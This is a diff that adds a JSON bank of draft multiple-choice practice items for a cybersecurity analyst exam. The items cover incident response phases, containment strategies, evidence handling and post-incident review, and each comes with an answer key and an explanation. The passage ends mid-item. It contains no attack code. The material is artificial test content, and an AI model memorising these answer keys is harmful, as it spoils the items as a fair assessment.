@@ -1,0 +1,2389 @@
+[
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-001",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "Before any incident occurs, a security team writes playbooks, defines escalation paths and deploys logging and endpoint monitoring. Which phase of the incident response life cycle is this?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Preparation"
+        },
+        {
+          "id": "b",
+          "text": "Containment"
+        },
+        {
+          "id": "c",
+          "text": "Eradication"
+        },
+        {
+          "id": "d",
+          "text": "Post-incident activity"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "Work done ahead of time so the team can detect and respond is preparation. Containment limits an active incident, eradication removes its cause, and post-incident activity reviews what happened after the fact.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-002",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "Which statement best describes the goal of the containment phase?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Remove the attacker's access and the root cause from every affected system"
+        },
+        {
+          "id": "b",
+          "text": "Limit the scope and impact of the incident so it cannot spread further"
+        },
+        {
+          "id": "c",
+          "text": "Return affected systems to normal service with verified clean data"
+        },
+        {
+          "id": "d",
+          "text": "Record what went well and what must change before the next incident"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "Containment stops an incident from growing. Removing the cause is eradication, returning to normal service is recovery, and recording what to change is the post-incident review.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-003",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "An analyst deletes a malicious scheduled task, removes an attacker-created account and applies the patch for the exploited flaw. Which phase is this?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Containment"
+        },
+        {
+          "id": "b",
+          "text": "Recovery"
+        },
+        {
+          "id": "c",
+          "text": "Eradication"
+        },
+        {
+          "id": "d",
+          "text": "Detection and analysis"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "Taking away the attacker's foothold and fixing the weakness that allowed entry is eradication. Containment only limits spread, recovery restores service, and detection and analysis confirms and scopes the incident.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-004",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "Systems are restored from clean backups, tested and watched for signs of reinfection before the incident is closed. Which phase does this describe?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Preparation"
+        },
+        {
+          "id": "b",
+          "text": "Containment"
+        },
+        {
+          "id": "c",
+          "text": "Detection and analysis"
+        },
+        {
+          "id": "d",
+          "text": "Recovery"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "Returning systems to a trusted state and watching them is recovery. Preparation happens before an incident, containment limits spread, and detection and analysis comes first when the activity is confirmed and scoped.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-005",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "What is the main purpose of a lessons-learned review held after an incident?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Find improvements to plans, tooling and training based on what happened"
+        },
+        {
+          "id": "b",
+          "text": "Assign disciplinary blame to the person who caused the incident"
+        },
+        {
+          "id": "c",
+          "text": "Gather additional forensic evidence from affected systems while it is still available"
+        },
+        {
+          "id": "d",
+          "text": "Decide whether the original event meets the criteria to be declared an incident"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "The review turns the incident into improvements to the plan, tools and training, and it works best without blame. Evidence collection happens during the response, and declaring an incident happens in detection and analysis.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-006",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "Which document sets out an organization's incident response roles, responsibilities and communication paths in general terms?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Business impact analysis"
+        },
+        {
+          "id": "b",
+          "text": "Incident response plan"
+        },
+        {
+          "id": "c",
+          "text": "Vulnerability scan report"
+        },
+        {
+          "id": "d",
+          "text": "Asset inventory"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "The incident response plan defines who does what and how the team communicates. A business impact analysis ranks business functions, a scan report lists weaknesses, and an inventory lists assets.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-007",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "What is a playbook in incident response?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A summary of incident metrics prepared for senior executives after closure"
+        },
+        {
+          "id": "b",
+          "text": "An inventory of assets with their owners and criticality ratings"
+        },
+        {
+          "id": "c",
+          "text": "A step-by-step procedure for handling one type of incident, such as ransomware"
+        },
+        {
+          "id": "d",
+          "text": "A contract with an outside provider for forensic services on retainer"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "A playbook gives responders concrete steps for a specific kind of incident. The other options describe a metrics report, an asset inventory and a retainer agreement, which support response but are not procedures.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-008",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "Which combination of facts would most justify rating an incident as high severity?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "The alert was raised by the SIEM instead of being reported by a user"
+        },
+        {
+          "id": "b",
+          "text": "The activity began outside of normal business hours on a weekend"
+        },
+        {
+          "id": "c",
+          "text": "The affected host runs an operating system that is several versions old"
+        },
+        {
+          "id": "d",
+          "text": "Regulated customer data is exposed on a system the business depends on"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "Severity follows business and data impact, so regulated data on a critical system raises it. The alert source, the time it started and the age of the operating system do not by themselves change the impact.",
+    "acronyms": [
+      "SIEM"
+    ],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-009",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "A ransomware outbreak encrypts a server of customer records, and the team estimates two weeks of work to restore it. Which impact category does that estimate describe?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Recoverability effort"
+        },
+        {
+          "id": "b",
+          "text": "Functional impact"
+        },
+        {
+          "id": "c",
+          "text": "Information impact"
+        },
+        {
+          "id": "d",
+          "text": "Detection latency in the SOC"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "The time and resources needed to restore service is the recoverability effort. Functional impact is the effect on business operations, and information impact is the effect on the data itself. Detection latency measures how long the team took to notice, not an impact.",
+    "acronyms": [
+      "SOC"
+    ],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-010",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "A threat intelligence report warns that a group is sending new phishing lures to firms in the company's industry. No alert has fired yet. How should the analyst classify the report?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "An indicator, which signals that an incident is already underway or has just ended"
+        },
+        {
+          "id": "b",
+          "text": "A precursor, which signals that an incident may occur in the future"
+        },
+        {
+          "id": "c",
+          "text": "A confirmed incident that requires immediate containment"
+        },
+        {
+          "id": "d",
+          "text": "A false positive that should be closed without action"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "A warning that an attack may come is a precursor, so the team should prepare. An indicator shows an incident is happening or has happened, nothing here is confirmed, and the report is not a false alarm.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-011",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "A responder must collect evidence from a suspected compromised server before isolating it. Which item should be captured first because it is lost when power is removed?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A full image of the system drive"
+        },
+        {
+          "id": "b",
+          "text": "Archived logs on the central log server"
+        },
+        {
+          "id": "c",
+          "text": "Memory contents and active network connections"
+        },
+        {
+          "id": "d",
+          "text": "Configuration files kept in version control"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "The order of volatility puts memory and live connections first, because they vanish at power-off. Disk contents persist, and logs on a central server and files in version control are stored elsewhere.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-012",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "Why does a forensic team record every person who handles an evidence disk, with dates and times?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "To reduce the time it takes to restore the affected server to production after an incident"
+        },
+        {
+          "id": "b",
+          "text": "To let the software vendor reproduce the flaw in its own test lab"
+        },
+        {
+          "id": "c",
+          "text": "To estimate how much recovery effort the business will need afterward"
+        },
+        {
+          "id": "d",
+          "text": "To maintain chain of custody so the evidence stays trustworthy and admissible"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "A documented chain of custody shows the evidence was not altered, which preserves its value in legal or disciplinary action. It has no effect on restore time, vendor testing or recovery estimates.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-013",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "A revenue-generating web server is compromised, and the business cannot afford to power it off. The team moves it to a restricted segment with limited access. Which containment strategy is this?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Segmentation, which limits the host's reach while its service keeps running"
+        },
+        {
+          "id": "b",
+          "text": "Full isolation, which disconnects the host from every network, including management"
+        },
+        {
+          "id": "c",
+          "text": "Eradication, which removes the attacker's footholds from the host"
+        },
+        {
+          "id": "d",
+          "text": "Recovery, which returns the host to a verified clean state"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "Placing the host in a restricted segment limits what it can reach while keeping it useful, which is segmentation. Full isolation would cut it off completely, and eradication and recovery are later phases.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-014",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "Which action is an example of long-term containment rather than short-term containment?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Unplugging the network cable from the infected workstation as soon as it is spotted, before analysis begins"
+        },
+        {
+          "id": "b",
+          "text": "Moving affected systems to a clean, hardened segment while permanent fixes are prepared"
+        },
+        {
+          "id": "c",
+          "text": "Blocking a malicious address at the perimeter firewall right away"
+        },
+        {
+          "id": "d",
+          "text": "Disabling a compromised account as soon as it is identified"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "Long-term containment keeps systems running in a safer arrangement while the real fix is built. Unplugging, blocking an address and disabling an account are quick actions that stop spread immediately, which is short-term containment.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-015",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "Which action belongs in eradication rather than containment?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Blocking the attacker's command server address at the perimeter firewall"
+        },
+        {
+          "id": "b",
+          "text": "Disconnecting the infected host from the production network at the switch port"
+        },
+        {
+          "id": "c",
+          "text": "Removing a malicious scheduled task and applying the patch for the flaw the attacker used"
+        },
+        {
+          "id": "d",
+          "text": "Capturing a memory image of the host so analysts can examine it later"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "Eradication removes the attacker's foothold and fixes the weakness. Blocking an address and disconnecting a host limit spread, which is containment, and a memory image is evidence collection.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-016",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "After a database server is restored from backup, what should the team do before returning it to full production?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Skip validation because the backup was tested during the preparation phase"
+        },
+        {
+          "id": "b",
+          "text": "Re-enable every account that was disabled during containment"
+        },
+        {
+          "id": "c",
+          "text": "Restore the previous firewall rules unchanged and close the ticket"
+        },
+        {
+          "id": "d",
+          "text": "Verify that data and services are intact, then monitor closely for reinfection"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "Recovery includes checking the restored system and watching it for signs the attacker has returned. Skipping validation, re-enabling every account and reusing old rules unchanged could hide or restore the original weakness.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-017",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "Why is restoring from a backup taken after the attacker first gained access risky?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "The backup may contain the attacker's persistence and bring the compromise back"
+        },
+        {
+          "id": "b",
+          "text": "The backup is likely too old to contain any current user files"
+        },
+        {
+          "id": "c",
+          "text": "The restore would exceed the recovery time objective by design"
+        },
+        {
+          "id": "d",
+          "text": "The backup software cannot read data written during an incident"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "A backup made after the intrusion can carry the attacker's backdoors, so the team should pick a point before the compromise or clean the restored system. Age, restore speed and software compatibility are not the concern.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-018",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "When is a lessons-learned meeting most useful?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "At the next annual security review, once other incidents can be compared across teams"
+        },
+        {
+          "id": "b",
+          "text": "Within a few days of closing the incident, while details are still fresh"
+        },
+        {
+          "id": "c",
+          "text": "Only after incidents that caused a confirmed breach of personal data"
+        },
+        {
+          "id": "d",
+          "text": "During containment, so that decisions can be corrected as they are made"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "Holding the review soon after closure captures accurate memories and logs. Waiting a year loses detail, limiting it to breaches skips useful lessons from other incidents, and holding it during containment distracts the team from the active response.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-019",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "A root cause analysis shows an intrusion began through an unpatched VPN appliance exposed to the internet. Which follow-up action best addresses the finding?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Add the attacker's address to a block list and close the incident"
+        },
+        {
+          "id": "b",
+          "text": "Replace the analysts who did not notice the alert sooner"
+        },
+        {
+          "id": "c",
+          "text": "Set a defined patching window for internet-facing devices and track compliance"
+        },
+        {
+          "id": "d",
+          "text": "Encrypt the backups with a stronger algorithm"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "The root cause is a patching gap, so the fix is a process that closes such gaps. Blocking an address treats a symptom, replacing staff does not fix the gap, and backup encryption is unrelated to how the attacker got in.",
+    "acronyms": [
+      "VPN"
+    ],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-020",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "An analyst builds an incident timeline from firewall, authentication and endpoint logs. Which problem would make the timeline most unreliable?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Every device recording its events in UTC with a consistent format across the network"
+        },
+        {
+          "id": "b",
+          "text": "All events being forwarded into one central SIEM for correlation"
+        },
+        {
+          "id": "c",
+          "text": "Several different log sources being used to confirm each step"
+        },
+        {
+          "id": "d",
+          "text": "Devices whose clocks are not synchronized to a common time source"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "If clocks drift, events from different devices cannot be placed in the correct order. Consistent UTC timestamps, a central SIEM and multiple sources all make a timeline stronger.",
+    "acronyms": [
+      "SIEM",
+      "UTC"
+    ],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-021",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "A ransomware outbreak has been contained. Before the team restores servers to production, which condition must be met first?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "The attacker's access paths and the root cause have been removed or closed"
+        },
+        {
+          "id": "b",
+          "text": "The post-incident report has been delivered to the executive team"
+        },
+        {
+          "id": "c",
+          "text": "All affected users have completed refresher security training"
+        },
+        {
+          "id": "d",
+          "text": "The playbook has been updated with the steps used this time"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "Restoring into an environment where the attacker can still get in invites reinfection, so eradication comes first. The report, training and playbook updates belong to the post-incident phase.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-022",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "Two incidents are open: a lost laptop with full-disk encryption, and a confirmed exfiltration from a database of customer payment data. How should the team prioritize?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Work the incidents in the order they were reported to keep things fair"
+        },
+        {
+          "id": "b",
+          "text": "Prioritize the exfiltration because it involves ongoing data loss and regulatory exposure"
+        },
+        {
+          "id": "c",
+          "text": "Prioritize the laptop because a physical loss is easier to resolve quickly and the device is already encrypted"
+        },
+        {
+          "id": "d",
+          "text": "Split the team evenly so that both incidents receive equal attention"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "Response is prioritized by risk and impact, and active loss of regulated data outweighs an encrypted lost device. Order of arrival, ease of resolution and an even split ignore the difference in impact.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-023",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "A review finds that responders could not tell which servers were critical, which slowed containment decisions. Which preparation improvement best addresses this?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Add more detection rules to the SIEM for common attack patterns"
+        },
+        {
+          "id": "b",
+          "text": "Purchase additional storage to hold a longer backup history"
+        },
+        {
+          "id": "c",
+          "text": "Maintain an asset inventory with criticality ratings and data classifications"
+        },
+        {
+          "id": "d",
+          "text": "Extend the retention period for firewall logs to one year"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "Knowing what each system does and what data it holds lets responders decide quickly what to isolate. Extra detection rules, backup storage and log retention do not tell the team which systems matter most.",
+    "acronyms": [
+      "SIEM"
+    ],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-024",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "A responder wants to power off a compromised host at once, but legal counsel asks that evidence be preserved. What is the best approach?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Power the host off now, because volatile data has little investigative value"
+        },
+        {
+          "id": "b",
+          "text": "Leave the host connected and untouched until legal counsel finishes its review of the evidence"
+        },
+        {
+          "id": "c",
+          "text": "Wipe and reimage the host so that the evidence cannot be tampered with"
+        },
+        {
+          "id": "d",
+          "text": "Capture memory and a forensic image under documented procedures, then isolate the host"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "Collecting volatile data and an image first preserves evidence, and isolation then stops further harm. Powering off destroys memory, leaving the host connected lets the attacker continue, and reimaging destroys the evidence.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-025",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "An incident exposes customers' personal data. Who should decide the timing and content of notices to regulators and affected customers?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Legal and compliance staff, with executive approval, following the communication plan"
+        },
+        {
+          "id": "b",
+          "text": "The analyst who first detected the incident, using whichever channel reaches customers the quickest"
+        },
+        {
+          "id": "c",
+          "text": "The vendor whose product was involved, since it holds the logs"
+        },
+        {
+          "id": "d",
+          "text": "Whichever responder is on call when the facts are confirmed"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "Notifications carry legal duties, so legal and compliance staff decide them under the plan the organization approved. An individual analyst, a vendor or an on-call responder should not make that call alone.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-026",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "The team suspects an attacker can read corporate email. Which practice is best for coordinating the response?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Keep using corporate email, but send shorter messages with fewer details about the investigation"
+        },
+        {
+          "id": "b",
+          "text": "Use a pre-approved out-of-band channel that is not hosted in the compromised environment"
+        },
+        {
+          "id": "c",
+          "text": "Post updates in the company-wide chat so that everyone stays informed"
+        },
+        {
+          "id": "d",
+          "text": "Move to each responder's personal messaging account for speed"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "If the attacker can read the normal channels, the team needs a separate channel that was set up in advance. Shorter email, company-wide chat and ad hoc personal accounts all leak response details or lack control.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-027",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "Three days after eradication, the same host begins beaconing to the same external address again. What is the most likely cause?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "The lessons-learned meeting was held too early in the process to be effective for the team"
+        },
+        {
+          "id": "b",
+          "text": "The preparation phase produced a playbook that was too long"
+        },
+        {
+          "id": "c",
+          "text": "Eradication missed a persistence mechanism, or the root cause was never closed"
+        },
+        {
+          "id": "d",
+          "text": "Detection thresholds in the SIEM were set to be too sensitive"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "The same behavior returning after cleanup points to something left behind or an entry point still open. The timing of the review, the length of a playbook and alert sensitivity do not make an attacker come back.",
+    "acronyms": [
+      "SIEM"
+    ],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-028",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "Which of the following is an incident rather than just an event?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A scheduled patch cycle restarts several servers overnight as planned"
+        },
+        {
+          "id": "b",
+          "text": "A firewall blocks a port scan from an external address on the perimeter during the afternoon"
+        },
+        {
+          "id": "c",
+          "text": "An employee signs in to the company VPN from home at the start of a shift"
+        },
+        {
+          "id": "d",
+          "text": "An attacker's password guesses succeed and log in to a customer portal account"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "An event is any observable occurrence, while an incident is an event that actually harms or threatens security. A successful attacker login to an account is an incident. The other three are routine or blocked activity.",
+    "acronyms": [
+      "VPN"
+    ],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-029",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "Which group is usually responsible for coordinating the technical response to a security incident?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A CSIRT"
+        },
+        {
+          "id": "b",
+          "text": "The change advisory board"
+        },
+        {
+          "id": "c",
+          "text": "The internal audit committee"
+        },
+        {
+          "id": "d",
+          "text": "The software development team"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "A cybersecurity incident response team coordinates detection, containment, eradication and recovery. A change board approves changes, an audit committee reviews controls, and developers build software.",
+    "acronyms": [
+      "CSIRT"
+    ],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-030",
+    "type": "mcq-multi",
+    "difficulty": 2,
+    "stem": "Which TWO activities belong to the preparation phase?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Removing the malware from every infected host"
+        },
+        {
+          "id": "b",
+          "text": "Defining escalation paths and who may declare an incident"
+        },
+        {
+          "id": "c",
+          "text": "Notifying the affected customers that their data was exposed"
+        },
+        {
+          "id": "d",
+          "text": "Deploying logging and endpoint monitoring tools"
+        },
+        {
+          "id": "e",
+          "text": "Restoring the affected systems from verified clean backups"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b",
+        "d"
+      ]
+    },
+    "explanation": "Escalation paths and monitoring tools are set up before an incident so the team can detect and respond. Removing malware is eradication, customer notification happens during response, and restoring backups is recovery.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-031",
+    "type": "mcq-multi",
+    "difficulty": 2,
+    "stem": "Which TWO activities belong to detection and analysis?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Correlating SIEM alerts with endpoint telemetry to scope the activity"
+        },
+        {
+          "id": "b",
+          "text": "Reimaging the affected workstations"
+        },
+        {
+          "id": "c",
+          "text": "Resetting the passwords of compromised accounts"
+        },
+        {
+          "id": "d",
+          "text": "Assigning a severity rating based on business impact"
+        },
+        {
+          "id": "e",
+          "text": "Holding a review meeting to update the playbooks"
+        },
+        {
+          "id": "f",
+          "text": "Blocking the attacker's address at the perimeter firewall"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a",
+        "d"
+      ]
+    },
+    "explanation": "Correlating data to scope the activity and rating its severity are analysis tasks. Reimaging and password resets belong to eradication and recovery, blocking an address is containment, and the review meeting is post-incident.",
+    "acronyms": [
+      "SIEM"
+    ],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
+    "id": "cs4-3-2-mcq-032",
+    "type": "mcq-multi",
+    "difficulty": 1,
+    "stem": "Which TWO actions are short-term containment?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Patching the vulnerability on every server"
+        },
+        {
+          "id": "b",
+          "text": "Disabling the compromised user account"
+        },
+        {
+          "id": "c",
+          "text": "Rewriting the ransomware playbook"
+        },
+        {
+          "id": "d",
+          "text": "Isolating the host with the EDR network containment feature"
+        },
+        {
+          "id": "e",
+          "text": "Restoring data from last night's backup"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b",
+        "d"
+      ]
+    },
+    "explanation": "Disabling an account and isolating a host both stop the incident from spreading right away. Patching is eradication, rewriting a playbook is post-incident work, and restoring data is recovery.",
+    "acronyms": [
+      "EDR"
+    ],
+    "status": "draft"
+  },
+  {
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "3.2"
+    ],
